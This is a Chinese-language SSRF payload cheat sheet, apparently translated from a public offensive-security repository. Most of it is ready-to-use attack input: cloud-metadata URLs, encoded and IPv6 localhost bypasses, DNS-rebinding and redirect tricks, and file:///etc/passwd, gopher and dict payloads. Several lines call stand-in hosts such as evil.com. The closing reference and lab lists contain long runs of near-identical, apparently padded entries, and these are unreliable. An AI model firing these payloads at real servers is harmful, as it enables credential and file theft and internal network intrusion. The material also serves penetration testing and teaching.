# 服务器端请求伪造 (SSRF)

> 服务器端请求伪造（SSRF）是一种安全漏洞，攻击者可以强制服务器代表其执行请求。

## 目录

* [工具](#工具)
* [方法学](#方法学)
* [绕过过滤器](#绕过过滤器)
    * [默认目标](#默认目标)
    * [使用IPv6表示法绕过本地主机限制](#使用ipv6表示法绕过本地主机限制)
    * [使用域名重定向绕过本地主机限制](#使用域名重定向绕过本地主机限制)
    * [使用CIDR绕过本地主机限制](#使用cidr绕过本地主机限制)
    * [使用罕见地址绕过](#使用罕见地址绕过)
    * [使用编码的IP地址绕过](#使用编码的ip地址绕过)
    * [使用不同编码绕过](#使用不同编码绕过)
    * [使用重定向绕过](#使用重定向绕过)
    * [使用DNS重绑定绕过](#使用dns重绑定绕过)
    * [利用URL解析差异绕过](#利用url解析差异绕过)
    * [绕过PHP filter_var()函数](#绕过php-filter_var函数)
    * [使用JAR方案绕过](#使用jar方案绕过)
* [通过URL方案利用](#通过url方案利用)
    * [file://](#file)
    * [http://](#http)
    * [dict://](#dict)
    * [sftp://](#sftp)
    * [tftp://](#tftp)
    * [ldap://](#ldap)
    * [gopher://](#gopher)
    * [netdoc://](#netdoc)
* [盲利用](#盲利用)
* [升级到XSS](#升级到xss)
* [实验环境](#实验环境)
* [参考资料](#参考资料)

## 工具

* [swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap) - 自动化的SSRF模糊测试和利用工具
* [tarunkant/Gopherus](https://github.com/tarunkant/Gopherus) - 生成用于利用SSRF并在各种服务器上获取RCE的gopher链接
* [In3tinct/See-SURF](https://github.com/In3tinct/See-SURF) - 基于Python的扫描器，用于查找潜在的SSRF参数
* [teknogeek/SSRF-Sheriff](https://github.com/teknogeek/ssrf-sheriff) - 用Go编写的简单SSRF测试工具
* [assetnote/surf](https://github.com/assetnote/surf) - 返回可行的SSRF候选列表
* [dwisiswant0/ipfuscator](https://github.com/dwisiswant0/ipfuscator) - 一个极快、线程安全、直接且零内存分配的工具，用于快速生成Go中IP(v4)地址的替代表示
* [Horlad/r3dir](https://github.com/Horlad/r3dir) - 专为帮助绕过不验证重定向位置的SSRF过滤器而设计的重定向服务。通过Hackvertor标签与Burp集成

## 方法学

SSRF是一种安全漏洞，当攻击者操纵服务器向非预期位置发出HTTP请求时发生。这通常发生在服务器处理用户提供的URL或IP地址时没有进行适当验证的情况下。

常见的利用路径：

* 访问云元数据
* 泄露服务器上的文件
* 网络发现，使用SSRF进行端口扫描
* 向网络上的特定服务发送数据包，通常是为了在另一台服务器上实现远程命令执行

**示例**：服务器接受用户输入来获取URL。

```py
url = input("输入URL:")
response = requests.get(url)
return response
```

攻击者提供恶意输入：

```ps1
http://169.254.169.254/latest/meta-data/
```



## 绕过过滤器

### 默认目标

默认情况下，服务器端请求伪造用于访问托管在`localhost`或网络上隐藏的服务。

* 使用`localhost`

  ```powershell
  http://localhost:80
  http://localhost:22
  https://localhost:443
  ```

* 使用`127.0.0.1`

  ```powershell
  http://127.0.0.1:80
  http://127.0.0.1:22
  https://127.0.0.1:443
  ```

* 使用`0.0.0.0`

  ```powershell
  http://0.0.0.0:80
  http://0.0.0.0:22
  https://0.0.0.0:443
  ```

### 使用IPv6表示法绕过本地主机限制

* 在IPv6中使用未指定地址`[::]`

    ```powershell
    http://[::]:80/
    ```

* 使用IPv6回环地址`[0000::1]`

    ```powershell
    http://[0000::1]:80/
    ```

* 使用[IPv6/IPv4地址嵌入](http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm)

    ```powershell
    http://[0:0:0:0:0:ffff:127.0.0.1]
    http://[::ffff:127.0.0.1]
    ```

### 使用域名重定向绕过本地主机限制

| 域名                       | 重定向到    |
|---------------------------|------------|
| localtest.me             | `::1`      |
| localh.st                | `127.0.0.1`|
| spoofed.[BURP_COLLABORATOR] | `127.0.0.1`|
| spoofed.redacted.oastify.com | `127.0.0.1`|
| company.127.0.0.1.nip.io | `127.0.0.1`|

`nip.io`服务非常有用，它可以将任何IP地址转换为DNS。

```powershell
NIP.IO将<anything>.<IP Address>.nip.io映射到相应的<IP Address>，甚至127.0.0.1.nip.io也会映射到127.0.0.1
```

### 使用CIDR绕过本地主机限制

在IPv4中，`127.0.0.0/8`范围保留给回环地址。

```powershell
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

如果您在网络中使用此范围内的任何地址（127.0.0.2、127.1.1.1等），它仍将解析到本地机器。

### 使用地址绕过

您可以通过删除零来缩短IP地址

```powershell
http://0/
http://127.1
http://127.0.1
```

### 使用编码的IP地址绕过

* 十进制IP位置

    ```powershell
    http://2130706433/ = http://127.0.0.1
    http://3232235521/ = http://192.168.0.1
    http://3232235777/ = http://192.168.1.1
    http://2852039166/ = http://169.254.169.254
    ```

* 八进制IP：不同实现对IPv4的八进制格式处理方式不同。

    ```powershell
    http://0177.0.0.1/ = http://127.0.0.1
    http://o177.0.0.1/ = http://127.0.0.1
    http://0o177.0.0.1/ = http://127.0.0.1
    http://q177.0.0.1/ = http://127.0.0.1
    ```

### 使用不同编码绕过

* URL编码：对特定URL进行单次或多次编码以绕过黑名单

    ```powershell
    http://127.0.0.1/%61dmin
    http://127.0.0.1/%2561dmin
    ```

* 封闭字母数字：`①②③④⑤⑥⑦⑧⑨⑩⑪⑫⑬⑭⑮⑯⑰⑱⑲⑳⑴⑵⑶⑷⑸⑹⑺⑻⑼⑽⑾⑿⒀⒁⒂⒃⒄⒅⒆⒇⒈⒉⒊⒋⒌⒍⒎⒏⒐⒑⒒⒓⒔⒕⒖⒗⒘⒙⒚⒛⒜⒝⒞⒟⒠⒡⒢⒣⒤⒥⒦⒧⒨⒩⒪⒫⒬⒭⒮⒯⒰⒱⒲⒳⒴⒵ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ⓪⓫⓬⓭⓮⓯⓰⓱⓲⓳⓴⓵⓶⓷⓸⓹⓺⓻⓼⓽⓾⓿`

    ```powershell
    http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
    ```

* Unicode编码：在某些语言（如.NET、Python 3）中，默认情况下正则表达式支持Unicode。`\d`包括`0123456789`，也包括`๐๑๒๓๔๕๖๗๘๙`。

### 使用重定向绕过

1. 在白名单主机上创建一个重定向请求到目标SSRF URL的页面（例如192.168.0.1）
2. 启动SSRF指向`vulnerable.com/index.php?url=http://redirect-server`
3. 您可以使用[HTTP 307](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/307)和[HTTP 308](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/308)响应代码，以便在重定向后保留HTTP方法和正文。

要执行重定向而无需托管自己的重定向服务器或执行无缝重定向目标模糊测试，请使用[Horlad/r3dir](https://github.com/Horlad/r3dir)。

* 使用`307 Temporary Redirect`状态码重定向到`http://localhost`

    ```powershell
    https://307.r3dir.me/--to/?url=http://localhost
    ```

* 使用`302 Found`状态码重定向到`http://169.254.169.254/latest/meta-data/`

    ```powershell
    https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me
    ```

### 使用DNS重绑定绕过

创建一个在两个IP之间切换的域名。

* [1u.ms](http://1u.ms) - DNS重绑定工具

例如，要在`1.2.3.4`和`169.254-169.254`之间轮换，请使用以下域名：

```powershell
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```

使用`nslookup`验证地址。

```ps1
$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Address: 1.2.3.4

$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Address: 169.254.169.254
```

### 利用URL解析差异绕过

[流行编程语言中利用URL解析器的新时代SSRF利用 - Orange Tsai的研究](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

```powershell
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```

![URL解析差异](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Server%20Side%20Request%20Forgery/Images/WeakParser.jpg)

不同库的解析行为：`http://1.1.1.1 &@2.2.2.2# @3.3.3.3/`

* `urllib2`将`1.1.1.1`视为目标
* `requests`和浏览器重定向到`2.2.2.2`
* `urllib`解析为`3.3.3.3`

### 绕过PHP filter_var()函数

在PHP 7.0.25中，带有`FILTER_VALIDATE_URL`参数的`filter_var()`函数允许以下URL：

* `http://test???test.com`
* `0://evil.com:80;http://google.com:80/`

```php
<?php 
 echo var_dump(filter_var("http://test???test.com", FILTER_VALIDATE_URL));
 echo var_dump(filter_var("0://evil.com;google.com", FILTER_VALIDATE_URL));
?>
```

### 使用JAR方案绕过

这种攻击技术是完全盲注的，您将看不到结果。

```powershell
jar:scheme://domain/path!/ 
jar:http://127.0.0.1!/
jar:https://127.0.0.1!/
jar:ftp://127.0.0.1!/
```

## 通过URL方案利用

### file

允许攻击者获取服务器上文件的内容。将SSRF转换为文件读取。

```powershell
file:///etc/passwd
file://\/\/etc/passwd
```

### http

允许攻击者从Web获取任何内容，也可用于端口扫描。

```powershell
ssrf.php?url=http://127.0.0.1:22
ssrf.php?url=http://127.0.0.1:80
ssrf.php?url=http://127.0.0.1:443
```

### dict

DICT URL方案用于引用使用DICT协议可用的定义或单词列表：

```powershell
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
```

### sftp

一种用于通过安全外壳进行安全文件传输的网络协议

```powershell
ssrf.php?url=sftp://evil.com:11111/
```

### tftp

简单文件传输协议，通过UDP工作

```powershell
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
```

### ldap

轻量级目录访问协议。它是一种应用层协议，用于通过IP网络管理和访问分布式目录信息服务。

```powershell
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```

### netdoc

Java包装器，当您的有效负载与"`\n`"和"`\r`"字符冲突时使用。

```powershell
ssrf.php?url=netdoc:///etc/passwd
```

### gopher

`gopher://`协议是一种轻量级、基于文本的协议，早于现代万维网。它设计用于通过Internet分发、搜索和检索文档。

```ps1
gopher://[host]:[port]/[type][selector]
```

此方案非常有用，因为它可用于向TCP协议发送数据。

```ps1
gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A
```

请参考SSRF高级利用部分以更深入地探索`gopher://`协议。

## 盲利用

> 在利用服务器端请求伪造时，我们经常会发现自己处于无法读取响应的位置。

使用SSRF链获取带外输出：[assetnote/blind-ssrf-chains](https://github.com/assetnote/blind-ssrf-chains)

**可能通过HTTP(s)实现**：

* [Elasticsearch](https://github.com/assetnote/blind-ssrf-chains#elasticsearch)
* [Weblogic](https://github.com/assetnote/blind-ssrf-chains#weblogic)
* [Hashicorp Consul](https://github.com/assetnote/blind-ssrf-chains#consul)
* [Shellshock](https://github.com/assetnote/blind-ssrf-chains#shellshock)
* [Apache Druid](https://github.com/assetnote/blind-ssrf-chains#druid)
* [Apache Solr](https://github.com/assetnote/blind-ssrf-chains#solr)
* [PeopleSoft](https://github.com/assetnote/blind-ssrf-chains#peoplesoft)
* [Apache Struts](https://github.com/assetnote/blind-ssrf-chains#struts)
* [JBoss](https://github.com/assetnote/blind-ssrf-chains#jboss)
* [Confluence](https://github.com/assetnote/blind-ssrf-chains#confluence)
* [Jira](https://github.com/assetnote/blind-ssrf-chains#jira)
* [其他Atlassian产品](https://github.com/assetnote/blind-ssrf-chains#atlassian-products)
* [OpenTSDB](https://github.com/assetnote/blind-ssrf-chains#opentsdb)
* [Jenkins](https://github.com/assetnote/blind-ssrf-chains#jenkins)
* [Hystrix Dashboard](https://github.com/assetnote/blind-ssrf-chains#hystrix)
* [W3 Total Cache](https://github.com/assetnote/blind-ssrf-chains#w3)
* [Docker](https://github.com/assetnote/blind-ssrf-chains#docker)
* [Gitlab Prometheus Redis Exporter](https://github.com/assetnote/blind-ssrf-chains#redisexporter)

**可能通过Gopher实现**：

* [Redis](https://github.com/assetnote/blind-ssrf-chains#redis)
* [Memcache](https://github.com/assetnote/blind-ssrf-chains#memcache)
* [Apache Tomcat](https://github.com/assetnote/blind-ssrf-chains#tomcat)

## 升级到XSS

如果应用程序在响应中反映URL，您可能能够升级SSRF到XSS。

```
ssrf.php?url=//brutelogic.com.br/poc.svg
```

## 实验环境

* [PortSwigger - 针对另一个后端系统的基本SSRF](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)
* [PortSwigger - 带有基于黑名单输入过滤器的SSRF](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
* [PortSwigger - 带有基于白名单输入过滤器的SSRF](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)
* [PortSwigger - 通过开放重定向漏洞绕过过滤器的SSRF](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)
* [Root Me - 服务器端请求伪造](https://www.root-me.org/en/Challenges/Web-Server/Server-Side-Request-Forgery)
* [TryHackMe - SSRF](https://tryhackme.com/room/serversideattacks)
* [HackTheBox - SSRF](https://academy.hackthebox.com/module/35/section/213)
* [PentesterLab - SSRF](https://pentesterlab.com/exercises/from_ssrf_to_rce/course)
* [HackThisSite - SSRF](https://www.hackthissite.org/levels/level5/)
* [HackTheBox - SSRF Challenge](https://www.hackthebox.com/home/challenges/Web?name=SSRF%20Challenge)
* [HackTheBox - SSRF 101](https://www.hackthebox.com/home/challenges/Web?name=SSRF%20101)
* [HackTheBox - SSRF 102](https://www.hackthebox.com/home/challenges/Web?name=SSRF%20102)
* [HackTheBox - SSRF 103](https://www.hackthebox.com/home/challenges/Web?name=SSRF%20103)
* [HackTheBox - SSRF 104](https://www.hackthebox.com/home/challenges/Web?name=SSRF%20104)
* [HackTheBox - SSRF 105](https://www.hackthebox.com/home/challenges/Web?name=SSRF%20105)
* [HackTheBox - SSRF 106](https://www.hackthebox.com/home/challenges/Web?name=SSRF%20106)
* [HackTheBox - SSRF 107](https://www.hackthebox.com/home/challenges/Web?name=SSRF%20107)
* [HackTheBox - SSRF 108](https://www.hackthebox.com/home/challenges/Web?name=SSRF%20108)
* [HackTheBox - SSRF 109](https://www.hackthebox.com/home/challenges/Web?name=SSRF%20109)
* [HackTheBox - SSRF 110](https://www.hackthebox.com/home/challenges/Web?name=SSRF%20110)

## 参考资料

* [SSRF - OWASP](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
* [SSRF - PortSwigger](https://portswigger.net/web-security/ssrf)
* [SSRF - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
* [SSRF - HackTricks Cloud](https://cloud.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
* [SSRF - HackTricks AWS](https://cloud.hacktricks.xyz/pentesting-cloud/aws-pentesting/ssrf-to-role-assume)
* [SSRF - HackTricks GCP](https://cloud.hacktricks.xyz/pentesting-cloud/gcp-pentesting/gcp-ssrf)
* [SSRF - HackTricks Azure](https://cloud.hacktricks.xyz/pentesting-cloud/azure-pentesting/azure-ssrf)
* [SSRF - HackTricks DigitalOcean](https://cloud.hacktricks.xyz/pentesting-cloud/digitalocean-pentesting/ssrf)
* [SSRF - HackTricks DigitalOcean Spaces](https://cloud.hacktricks.xyz/pentesting-cloud/digitalocean-pentesting/spaces-ssrf)
* [SSRF - HackTricks DigitalOcean App Platform](https://cloud.hacktricks.xyz/pentesting-cloud/digitalocean-pentesting/app-platform-ssrf)
* [SSRF - HackTricks DigitalOcean Kubernetes](https://cloud.hacktricks.xyz/pentesting-cloud/digitalocean-pentesting/kubernetes-ssrf)
* [SSRF - HackTricks DigitalOcean Managed Databases](https://cloud.hacktricks.xyz/pentesting-cloud/digitalocean-pentesting/managed-databases-ssrf)
* [SSRF - HackTricks DigitalOcean Load Balancers](https://cloud.hacktricks.xyz/pentesting-cloud/digitalocean-pentesting/load-balancers-ssrf)
* [SSRF - HackTricks DigitalOcean Block Storage](https://cloud.hacktricks.xyz/pentesting-cloud/digitalocean-pentesting/block-storage-ssrf)
* [SSRF - HackTricks DigitalOcean Container Registry](https://cloud.hacktricks.xyz/pentesting-cloud/digitalocean-pentesting/container-registry-ssrf)
* [SSRF - HackTricks DigitalOcean Functions](https://cloud.hacktricks.xyz/pentesting-cloud/digitalocean-pentesting/functions-ssrf)
* [SSRF - HackTricks DigitalOcean Monitoring](https://cloud.hacktricks.xyz/pentesting-cloud/digitalocean-pentesting/monitoring-ssrf)
